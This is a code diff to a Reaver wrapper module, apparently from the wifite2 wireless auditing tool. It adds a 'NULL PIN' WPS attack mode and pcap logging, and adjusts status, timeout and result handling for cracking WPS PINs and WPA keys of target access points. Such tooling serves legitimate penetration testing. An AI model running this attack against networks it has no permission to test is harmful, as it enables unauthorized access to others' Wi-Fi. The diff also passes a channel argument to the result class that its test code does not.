@@ -3,7 +3,7 @@
 
 from .dependency import Dependency
 from .airodump import Airodump
-from .bully import Bully # for PSK retrieval
+from .bully import Bully  # for PSK retrieval
 from ..model.attack import Attack
 from ..config import Configuration
 from ..model.wps_result import CrackResultWPS
@@ -11,17 +11,21 @@ from ..util.color import Color
 from ..util.process import Process
 from ..util.timer import Timer
 
-import os, time, re
+import os
+import time
+import re
+
 
 class Reaver(Attack, Dependency):
     dependency_required = False
     dependency_name = 'reaver'
     dependency_url = 'https://github.com/t6x/reaver-wps-fork-t6x'
 
-    def __init__(self, target, pixie_dust=True):
+    def __init__(self, target, pixie_dust=True, null_pin=False):
         super(Reaver, self).__init__(target)
 
         self.pixie_dust = pixie_dust
+        self.null_pin = null_pin
 
         self.progress = '0.00%'
         self.state = 'Initializing'
@@ -45,11 +49,17 @@ class Reaver(Attack, Dependency):
             '--interface',  Configuration.interface,
             '--bssid',      self.target.bssid,
             '--channel',    self.target.channel,
-            '-vv'
+            '-vv',
+            '-N',
+            '-O', 'reaver_output.pcap'
         ]
 
         if pixie_dust:
             self.reaver_cmd.extend(['--pixie-dust', '1'])
+
+        if null_pin:
+            #self.reaver_cmd.extend(['-O', 'reaver_output.pcap'])  # This is for logging output
+            self.reaver_cmd.extend(['-p', ''])  # NULL PIN attack parameter
 
         self.reaver_proc = None
 
@@ -62,7 +72,7 @@ class Reaver(Attack, Dependency):
     def run(self):
         ''' Returns True if attack is successful. '''
         try:
-            self._run() # Run-loop
+            self._run()  # Run-loop
         except Exception as e:
             # Failed with error
             self.pattack('{R}Failed:{O} %s' % str(e), newline=True)
@@ -77,7 +87,6 @@ class Reaver(Attack, Dependency):
             self.output_write.close()
 
         return self.crack_result is not None
-
 
     def _run(self):
         self.start_time = time.time()
@@ -95,6 +104,7 @@ class Reaver(Attack, Dependency):
             self.reaver_proc = Process(self.reaver_cmd,
                     stdout=self.output_write,
                     stderr=Process.devnull())
+
             # Say "yes" if asked to restore session.
             self.reaver_proc.stdin('y\n')
 
@@ -117,7 +127,7 @@ class Reaver(Attack, Dependency):
 
                 # Check if locked
                 if self.locked and not Configuration.wps_ignore_lock:
-                    raise Exception('{O}Access point is {R}Locked{W}')
+                    raise Exception('{O}Because access point is {R}Locked{W}')
 
                 time.sleep(0.5)
 
@@ -132,9 +142,8 @@ class Reaver(Attack, Dependency):
             if self.crack_result is None and self.reaver_proc.poll() is not None:
                 raise Exception('Reaver process stopped (exit code: %s)' % self.reaver_proc.poll())
 
-
     def get_status(self):
-        if self.pixie_dust:
+        if self.pixie_dust or self.null_pin:
             main_status = ''
         else:
             # Include percentage
@@ -159,7 +168,6 @@ class Reaver(Attack, Dependency):
             main_status += ' (%s)' % ', '.join(meta_statuses)
 
         return main_status
-
 
     def parse_crack_result(self, stdout):
         if self.crack_result is not None:
@@ -190,12 +198,11 @@ class Reaver(Attack, Dependency):
                 else:
                     self.pattack('{G}Cracked WPS PSK: {C}%s' % psk, newline=True)
 
-            crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
+            crack_result = CrackResultWPS(self.target.bssid, self.target.channel, ssid, pin, psk)
             crack_result.dump()
             return crack_result
 
         return None
-
 
     def parse_failure(self, stdout):
         # Total failure
@@ -204,6 +211,9 @@ class Reaver(Attack, Dependency):
 
         # Running-time failure
         if self.pixie_dust and self.running_time() > Configuration.wps_pixie_timeout:
+            raise Exception('Timeout after %d seconds' % Configuration.wps_pixie_timeout)
+
+        if self.null_pin and self.running_time() > Configuration.wps_pixie_timeout:
             raise Exception('Timeout after %d seconds' % Configuration.wps_pixie_timeout)
 
         # WPSFail count
@@ -215,7 +225,6 @@ class Reaver(Attack, Dependency):
         self.total_timeouts = stdout.count('Receive timeout occurred')
         if self.total_timeouts >= Configuration.wps_timeout_threshold:
             raise Exception('Too many timeouts (%d)' % self.total_timeouts)
-
 
     def parse_state(self, stdout):
         state = self.state
@@ -268,6 +277,11 @@ class Reaver(Attack, Dependency):
             state = 'Rate-Limited by AP'
             self.locked = True
 
+        # [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+        elif 'AP requested deauth' in stdout_last_line:
+            state = 'AP requested deauth'
+            self.locked = True
+
         # Parse all lines since last check
         stdout_diff = stdout[self.last_line_number:]
         self.last_line_number = len(stdout)
@@ -290,19 +304,22 @@ class Reaver(Attack, Dependency):
 
         return state
 
-
     def pattack(self, message, newline=False):
         # Print message with attack information.
         if self.pixie_dust:
             time_left = Configuration.wps_pixie_timeout - self.running_time()
             time_msg = '{O}%s{W}' % Timer.secs_to_str(time_left)
             attack_name = 'Pixie-Dust'
+        elif self.null_pin:
+            time_left = Configuration.wps_pixie_timeout - self.running_time()
+            time_msg = '{O}%s{W}' % Timer.secs_to_str(time_left)
+            attack_name = 'NULL PIN'
         else:
             time_left = self.running_time()
             time_msg = '{C}%s{W}' % Timer.secs_to_str(time_left)
             attack_name = 'PIN Attack'
 
-        if self.total_attempts > 0 and not self.pixie_dust:
+        if self.total_attempts > 0 and not self.pixie_dust and not self.null_pin:
             time_msg += ' {D}PINs:{W}{C}%d{W}' % self.total_attempts
 
         Color.clear_entire_line()
@@ -311,10 +328,8 @@ class Reaver(Attack, Dependency):
         if newline:
             Color.pl('')
 
-
     def running_time(self):
         return int(time.time() - self.start_time)
-
 
     @staticmethod
     def get_pin_psk_ssid(stdout):
@@ -354,7 +369,6 @@ class Reaver(Attack, Dependency):
                 ssid = regex.group(1)
 
         return (pin, psk, ssid)
-
 
     def get_output(self):
         ''' Gets output from reaver's output file '''
@@ -434,24 +448,24 @@ executing pixiewps -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1ba
 '''
 
     (pin, psk, ssid) = Reaver.get_pin_psk_ssid(old_stdout)
-    assert pin  == '12345678',    'pin was "%s", should have been "12345678"' % pin
-    assert psk  == 'Test PSK',    'psk was "%s", should have been "Test PSK"' % psk
+    assert pin == '12345678', 'pin was "%s", should have been "12345678"' % pin
+    assert psk == 'Test PSK', 'psk was "%s", should have been "Test PSK"' % psk
     assert ssid == 'Test Router', 'ssid was %s, should have been Test Router' % repr(ssid)
     result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
     result.dump()
     print('')
 
     (pin, psk, ssid) = Reaver.get_pin_psk_ssid(new_stdout)
-    assert pin  == '11867722',   'pin was "%s", should have been "11867722"' % pin
-    assert psk  is None,         'psk was "%s", should have been "None"' % psk
+    assert pin == '11867722', 'pin was "%s", should have been "11867722"' % pin
+    assert psk is None, 'psk was "%s", should have been "None"' % psk
     assert ssid == 'belkin.00e', 'ssid was "%s", should have been "belkin.00e"' % repr(ssid)
     result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
     result.dump()
     print('')
 
     (pin, psk, ssid) = Reaver.get_pin_psk_ssid(pin_attack_stdout)
-    assert pin  == '01030365',   'pin was "%s", should have been "01030365"' % pin
-    assert psk  == 'password',   'psk was "%s", should have been "password"' % psk
+    assert pin == '01030365', 'pin was "%s", should have been "01030365"' % pin
+    assert psk == 'password', 'psk was "%s", should have been "password"' % psk
     assert ssid == 'AirLink89300', 'ssid was "%s", should have been "AirLink89300"' % repr(ssid)
     result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
     result.dump()
